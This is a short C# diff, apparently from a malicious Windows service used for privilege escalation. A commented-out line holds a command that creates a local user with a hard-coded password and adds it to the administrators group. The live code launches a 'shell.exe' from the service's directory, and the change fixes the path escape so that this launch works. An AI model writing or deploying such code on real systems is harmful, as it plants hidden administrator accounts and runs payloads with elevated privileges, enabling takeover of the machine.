@@ -40,7 +40,7 @@
             //startInfo.Arguments = "/C net user sasamba Sasamba1! /add && net localgroup administrators sasamba /add";
             string path = System.Reflection.Assembly.GetExecutingAssembly().CodeBase;
             var service_dir = System.IO.Path.GetDirectoryName(path);
-            startInfo.FileName = service_dir+"\shell.exe";
+            startInfo.FileName = service_dir+"\\shell.exe";
             process.StartInfo = startInfo;
             process.Start();
 
